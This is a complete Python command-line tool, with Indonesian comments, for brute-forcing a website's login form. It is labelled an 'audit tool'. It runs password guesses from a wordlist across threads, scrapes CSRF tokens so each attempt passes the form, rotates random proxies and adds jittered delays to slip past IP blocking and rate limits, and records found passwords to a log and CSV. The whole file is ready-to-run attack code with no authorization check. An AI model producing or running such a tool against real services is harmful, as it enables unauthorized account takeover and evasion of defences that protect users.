import requests
from typing import List, Optional, Dict
from bs4 import BeautifulSoup
import logging
import time
import argparse
import csv
import threading
from queue import Queue
import random
import sys

logging.basicConfig(
    filename="bruteforce_audit.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def scrape_tokens(session: requests.Session, login_url: str, token_fields: Optional[List[str]] = None) -> Dict[str, str]:
    """
    Scrape hidden input tokens from login form (optional, tergantung sistem).
    """
    resp = session.get(login_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    form = soup.find("form")
    tokens = {}
    if form:
        for inp in form.find_all("input"):
            name = inp.get("name")
            value = inp.get("value", "")
            if name:
                tokens[name] = value
    if token_fields:
        tokens = {k: v for k, v in tokens.items() if k in token_fields}
    return tokens

def is_login_success(response: requests.Response, success_indicator: Optional[str] = None) -> bool:
    """
    Tentukan apakah login berhasil.
    Bisa berdasarkan redirect, status code, atau string tertentu pada response.
    """
    if response.status_code in (301, 302):
        return True
    if success_indicator and success_indicator in response.text:
        return True
    # Contoh: jika sistem redirect ke /dashboard setelah login sukses
    if response.url.endswith("/dashboard"):
        return True
    return False

def load_wordlist(wordlist_path: str) -> List[str]:
    with open(wordlist_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def load_proxies(proxy_path: Optional[str]) -> List[str]:
    if not proxy_path:
        return []
    with open(proxy_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def get_random_proxy(proxies: List[str]) -> Optional[dict]:
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {
        "http": proxy,
        "https": proxy
    }

class BruteForceWorker(threading.Thread):
    def __init__(
        self,
        queue: Queue,
        login_url: str,
        username: str,
        username_field: str,
        password_field: str,
        token_fields: Optional[List[str]],
        success_indicator: Optional[str],
        proxies: List[str],
        delay: float,
        found_flag: threading.Event,
        results: List[Dict],
        results_lock: threading.Lock
    ):
        super().__init__()
        self.queue = queue
        self.login_url = login_url
        self.username = username
        self.username_field = username_field
        self.password_field = password_field
        self.token_fields = token_fields
        self.success_indicator = success_indicator
        self.proxies = proxies
        self.delay = delay
        self.found_flag = found_flag
        self.results = results
        self.results_lock = results_lock

    def run(self):
        session = requests.Session()
        while not self.queue.empty() and not self.found_flag.is_set():
            password = self.queue.get()
            try:
                tokens = {}
                if self.token_fields:
                    tokens = scrape_tokens(session, self.login_url, self.token_fields)
                data = {
                    self.username_field: self.username,
                    self.password_field: password,
                    **tokens
                }
                proxy = get_random_proxy(self.proxies)
                resp = session.post(
                    self.login_url,
                    data=data,
                    allow_redirects=True,
                    timeout=10,
                    proxies=proxy
                )
                success = is_login_success(resp, self.success_indicator)
                logging.info(
                    f"ATTEMPT: username={self.username}, password={password}, status_code={resp.status_code}, url_after={resp.url}, success={success}, proxy_used={proxy}"
                )
                print(f"Trying: {self.username}:{password} -> {'SUCCESS' if success else 'FAIL'} (proxy: {proxy['http'] if proxy else 'None'})")
                result = {
                    "username": self.username,
                    "password": password,
                    "status_code": resp.status_code,
                    "url_after": resp.url,
                    "success": success,
                    "response_length": len(resp.text),
                    "proxy_used": proxy["http"] if proxy else None
                }
                with self.results_lock:
                    self.results.append(result)
                if success:
                    print(f"[+] Password found: {password}")
                    self.found_flag.set()
                    self.queue.task_done()
                    break
            except Exception as e:
                logging.error(f"Error on {self.username}:{password} - {e}")
                result = {
                    "username": self.username,
                    "password": password,
                    "status_code": "ERROR",
                    "url_after": "",
                    "success": False,
                    "response_length": 0,
                    "proxy_used": proxy["http"] if proxy else None,
                    "error": str(e)
                }
                with self.results_lock:
                    self.results.append(result)
            time.sleep(self.delay + random.uniform(0, 0.5))
            self.queue.task_done()

def write_results_to_csv(results: List[Dict], csv_path: str):
    if not results:
        return
    fieldnames = list(results[0].keys())
    with open(csv_path, "w", newline='', encoding="utf-8") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for row in results:
            writer.writerow(row)

def brute_force_login(
    login_url: str,
    username: str,
    wordlist_path: str,
    username_field: str = "username",
    password_field: str = "password",
    token_fields: Optional[List[str]] = None,
    success_indicator: Optional[str] = None,
    delay: float = 0.5,
    threads: int = 5,
    proxy_path: Optional[str] = None,
    csv_output: Optional[str] = None
):
    password_list = load_wordlist(wordlist_path)
    proxies = load_proxies(proxy_path)
    queue = Queue()
    for password in password_list:
        queue.put(password)
    found_flag = threading.Event()
    results = []
    results_lock = threading.Lock()
    workers = []
    for _ in range(threads):
        worker = BruteForceWorker(
            queue=queue,
            login_url=login_url,
            username=username,
            username_field=username_field,
            password_field=password_field,
            token_fields=token_fields,
            success_indicator=success_indicator,
            proxies=proxies,
            delay=delay,
            found_flag=found_flag,
            results=results,
            results_lock=results_lock
        )
        worker.daemon = True
        worker.start()
        workers.append(worker)
    queue.join()
    if not found_flag.is_set():
        print("[-] Password not found in wordlist.")
    if csv_output:
        write_results_to_csv(results, csv_output)
        print(f"[i] Results written to {csv_output}")
    return results

def main():
    parser = argparse.ArgumentParser(description="Brute Force Audit Tool Full CLI (Multi-thread, Proxy, CSV, Token Scraping)")
    parser.add_argument("--login-url", required=True, help="URL endpoint login target")
    parser.add_argument("--username", required=True, help="Username target")
    parser.add_argument("--wordlist", required=True, help="Path ke file wordlist password")
    parser.add_argument("--username-field", default="username", help="Nama field username (default: username)")
    parser.add_argument("--password-field", default="password", help="Nama field password (default: password)")
    parser.add_argument("--token-fields", nargs="*", default=None, help="Nama field token dinamis (misal: csrf_token)")
    parser.add_argument("--success-indicator", default=None, help="String unik pada halaman setelah login sukses")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay antar request (detik)")
    parser.add_argument("--threads", type=int, default=5, help="Jumlah thread (default: 5)")
    parser.add_argument("--proxy-path", default=None, help="Path file proxy (opsional, satu proxy per baris, format http://ip:port)")
    parser.add_argument("--csv-output", default=None, help="Path file output CSV")
    args = parser.parse_args()

    brute_force_login(
        login_url=args.login_url,
        username=args.username,
        wordlist_path=args.wordlist,
        username_field=args.username_field,
        password_field=args.password_field,
        token_fields=args.token_fields,
        success_indicator=args.success_indicator,
        delay=args.delay,
        threads=args.threads,
        proxy_path=args.proxy_path,
        csv_output=args.csv_output
    )

if __name__ == "__main__":
    main()